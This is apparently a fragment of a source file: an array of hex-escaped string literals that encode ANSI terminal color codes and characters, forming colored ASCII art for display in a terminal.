"\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40"
"\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30"
"\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30"
"\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40"
"\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30"
"\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30"
"\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40"
"\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30"
"\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30"
"\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40"
"\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b"
"\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38"
"\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30"
"\x3b\x34\x30\x6d\x38\x38\x38\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30"
"\x6d\x58\x1b\x5b\x30\x3b\x33\x32\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31"
"\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38"
"\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x38\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d"
"\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b"
"\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b"
"\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d"
"\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b"
"\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b"
"\x35\x3b\x33\x32\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d"
"\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x35"
"\x3b\x33\x33\x3b\x34\x30\x6d\x25\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30"
"\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x3a\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x53\x1b\x5b\x30\x3b"
"\x35\x3b\x33\x33\x3b\x34\x30\x6d\x3b\x74\x2e\x38\x3a\x20\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x20\x1b\x5b\x30\x3b\x35"
"\x3b\x33\x33\x3b\x34\x30\x6d\x40\x25\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34"
"\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33"
"\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b"
"\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34"
"\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33"
"\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b"
"\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b"
"\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30"
"\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31"
"\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b"
"\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33"
"\x33\x3b\x34\x30\x6d\x53\x20\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x20\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d"
"\x74\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x2e\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33"
"\x31\x3b\x34\x30\x6d\x25\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x53"
"\x53\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x20\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x25\x1b\x5b\x30\x3b\x31"
"\x3b\x33\x37\x3b\x34\x37\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x20\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37"
"\x6d\x3a\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x2e\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x20\x1b\x5b\x30\x3b"
"\x35\x3b\x33\x37\x3b\x34\x37\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x2e\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34"
"\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x35\x3b\x34\x30\x6d\x25\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x38\x1b\x5b\x30"
"\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x74\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x3b\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b"
"\x34\x37\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x38\x40\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58"
"\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x31"
"\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x32\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30"
"\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30"
"\x6d\x38\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d"
"\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30"
"\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x35\x3b\x34\x30\x6d\x2e\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b"
"\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x20\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x37\x6d\x3b\x1b\x5b"
"\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x20\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x37\x6d\x25\x1b\x5b\x30\x3b\x35\x3b\x33\x33"
"\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x74\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b"
"\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x2e\x1b\x5b\x30\x3b\x31\x3b\x33"
"\x37\x3b\x34\x37\x6d\x3a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x37\x6d\x58"
"\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x38\x2e\x74\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x2e\x1b\x5b\x30\x3b"
"\x31\x3b\x33\x30\x3b\x34\x37\x6d\x74\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34"
"\x37\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30\x6d\x58\x1b\x5b\x30"
"\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x3b\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b"
"\x34\x37\x6d\x58\x25\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x36\x3b\x34\x30\x6d\x25\x1b"
"\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x37\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33"
"\x30\x3b\x34\x37\x6d\x20\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x74\x3b\x3a\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d"
"\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31"
"\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35"
"\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x30\x3b\x34\x31\x6d\x38"
"\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x32"
"\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x37\x6d\x25\x1b"
"\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x20\x53\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x25\x20\x1b\x5b\x30\x3b\x35"
"\x3b\x33\x33\x3b\x34\x30\x6d\x20\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30"
"\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x35\x3b"
"\x33\x33\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d"
"\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35"
"\x3b\x33\x31\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34"
"\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x35\x3b\x34\x30\x6d\x20\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x20\x53\x1b\x5b"
"\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x20\x3a\x1b\x5b\x30\x3b\x31\x3b"
"\x33\x30\x3b\x34\x37\x6d\x53\x40\x38\x25\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x25\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b"
"\x34\x37\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x25\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x3b\x25\x1b"
"\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b"
"\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b"
"\x35\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b"
"\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b"
"\x5b\x30\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30"
"\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b"
"\x33\x30\x3b\x34\x37\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x20\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d"
"\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x40\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31"
"\x3b\x33\x30\x3b\x34\x30\x6d\x40\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30"
"\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b"
"\x31\x3b\x33\x30\x3b\x34\x37\x6d\x25\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34"
"\x37\x6d\x2e\x58\x3b\x25\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b"
"\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33"
"\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x3b\x1b\x5b"
"\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30"
"\x3b\x34\x37\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x20\x1b"
"\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x37\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b"
"\x34\x30\x6d\x25\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b"
"\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d"
"\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d"
"\x40\x38\x1b\x5b\x30\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b"
"\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b"
"\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b"
"\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x25\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b"
"\x33\x32\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d"
"\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x35\x3b"
"\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d"
"\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x37\x6d\x3a\x2e\x20\x20\x20\x2e\x2e\x3b\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37"
"\x6d\x3a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b"
"\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38"
"\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33"
"\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38"
"\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33"
"\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b"
"\x30\x3b\x33\x32\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b"
"\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34"
"\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33"
"\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38"
"\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30"
"\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30"
"\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b"
"\x34\x30\x6d\x25\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x74\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x37\x6d\x74\x20\x20"
"\x20\x20\x20\x20\x2e\x2e\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x58"
"\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34"
"\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33"
"\x32\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b"
"\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b"
"\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b"
"\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d"
"\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b"
